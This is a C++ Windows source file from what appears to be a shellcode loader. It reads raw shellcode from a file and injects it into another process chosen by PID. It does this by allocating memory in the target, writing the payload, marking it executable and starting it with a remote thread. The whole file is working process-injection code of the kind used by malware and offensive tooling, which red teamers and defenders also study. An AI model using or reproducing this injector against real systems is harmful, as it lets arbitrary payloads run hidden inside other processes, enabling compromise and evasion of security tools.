#include "ldr.hpp"

namespace Ldr
{
    LPVOID ReadShellcode(PCHAR filePath, DWORD& dwDataSize)
    {
        printf("[i] Reading shellcode...\n");

        HANDLE hFile = CreateFileA(
            filePath,
            GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hFile == INVALID_HANDLE_VALUE || !hFile)
        {
            printf("[x] Failed to open file: %s\n", filePath);
            return nullptr;
        }

        DWORD dwFileSize = GetFileSize(hFile, NULL);
        if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0)
        {
            printf("[x] Failed to get file size.\n");
            CloseHandle(hFile);
            return nullptr;
        }

        LPVOID lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwFileSize);
        if (!lpBuffer)
        {
            printf("[x] Failed to allocate for buffer.\n");
            return nullptr;
        }

        DWORD dwBytesRead;
        if (!ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL))
        {
            printf("[x] Failed to read file.\n");
            CloseHandle(hFile);
            HeapFree(GetProcessHeap(), 0, lpBuffer);
            return nullptr;
        }

        CloseHandle(hFile);

        dwDataSize = dwBytesRead;

        return lpBuffer;
    }

    BOOL InjectShellcode(DWORD dwPID, LPVOID lpBuffer, DWORD dwBufferSize)
    {
        printf("[i] Injecting shellcode...\n");

        HANDLE hProcess = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            dwPID
        );
        if (!hProcess)
        {
            printf("[x] Failed to open process: <ERROR_CODE: %ld>\n", GetLastError());
            return FALSE;
        }

        LPVOID lpBaseAddr = VirtualAllocEx(
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!lpBaseAddr)
        {
            printf("[x] Failed to allocate memory: <ERROR_CODE: %ld>\n", GetLastError());
            CloseHandle(hProcess);
            return FALSE;
        }

        if (!WriteProcessMemory(
            hProcess,
            lpBaseAddr,
            lpBuffer,
            dwBufferSize,
            nullptr
        )) {
            printf("[x] Failed to write process memory: <ERROR_CODE: %ld>\n", GetLastError());
            CloseHandle(hProcess);
            return FALSE;
        }

        DWORD dwOldProtect = PAGE_READWRITE;
        if (!VirtualProtectEx(
            hProcess,
            lpBaseAddr,
            dwBufferSize,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
        )) {
            printf("[x] Failed to protect virtual memory: <ERROR_CODE: %ld>\n", GetLastError());
            CloseHandle(hProcess);
            return FALSE;
        }

        HANDLE hThread = CreateRemoteThreadEx(
            hProcess,
            nullptr,
            0,
            (LPTHREAD_START_ROUTINE)lpBaseAddr,
            nullptr,
            0,
            nullptr,
            nullptr
        );
        if (!hThread)
        {
            printf("[x] Failed to create remote thread: <ERROR_CODE: %ld>\n", GetLastError());
            CloseHandle(hProcess);
            return FALSE;
        }

        WaitForSingleObject(hThread, INFINITE);

        CloseHandle(hProcess);
        CloseHandle(hThread);

        return TRUE;
    }
}
